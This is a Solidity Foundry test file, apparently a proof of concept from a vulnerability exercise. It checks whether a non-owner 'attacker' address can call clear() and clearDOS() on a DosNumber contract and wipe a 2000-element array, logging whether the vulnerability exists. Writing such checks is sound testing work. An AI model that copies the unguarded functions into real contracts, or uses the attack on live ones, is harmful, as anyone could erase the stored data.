// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/dos_number.sol";

contract DosNumberTest is Test {
    DosNumber public dosNumber;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        dosNumber = new DosNumber();
    }

    function test_NonOwnerCanClearArray() public {
        // Setup: Insert more than 1500 elements
        vm.prank(owner);
        dosNumber.insertNnumbers(42, 2000);
        
        // Pre-trigger state
        console2.log("--- BEFORE-Trigger ---");
        uint prevLength = dosNumber.getLengthArray();
        uint prevClears = dosNumber.totalClears();
        console2.log("Initial array length:", prevLength);
        console2.log("Initial clear count:", prevClears);
        
        console2.log("--- Trigger clear ---");
        // Attack: Non-owner clears array
        vm.prank(attacker);
        dosNumber.clear();
        
        // Post-trigger state
        console2.log("--- AFTER-Trigger ---");
        uint newLength = dosNumber.getLengthArray();
        uint newClears = dosNumber.totalClears();
        console2.log("Array length after attack:", newLength);
        console2.log("Clear count after attack:", newClears);
        
        // Vulnerability validation
        if (newLength == 0 && newClears == prevClears + 1) {
            console2.log("Vulnerability Exists: Array cleared and counter incremented by non-owner");
        } else {
            console2.log("Vulnerability not Exist: Array not cleared or clear counter unchanged");
        }
    }

    function test_NonOwnerCanClearDOSArray() public {
        // Setup: Insert more than 1500 elements
        vm.prank(owner);
        dosNumber.insertNnumbers(42, 2000);
        
        // Pre-trigger state
        console2.log("--- BEFORE-Trigger ---");
        uint prevLength = dosNumber.getLengthArray();
        uint prevClears = dosNumber.totalClears();
        console2.log("Initial array length:", prevLength);
        console2.log("Initial clear count:", prevClears);
        
        console2.log("--- Trigger clearDOS ---");
        // Attack: Non-owner clears DOS array
        vm.prank(attacker);
        dosNumber.clearDOS();
        
        // Post-trigger state
        console2.log("--- AFTER-Trigger ---");
        uint newLength = dosNumber.getLengthArray();
        uint newClears = dosNumber.totalClears();
        console2.log("Array length after attack:", newLength);
        console2.log("Clear count after attack:", newClears);
        
        // Vulnerability validation
        if (newLength == 0 && newClears == prevClears + 1) {
            console2.log("Vulnerability Exists: DOS array cleared and counter incremented by non-owner");
        } else {
            console2.log("Vulnerability not Exist: DOS array not cleared or clear counter unchanged");
        }
    }
}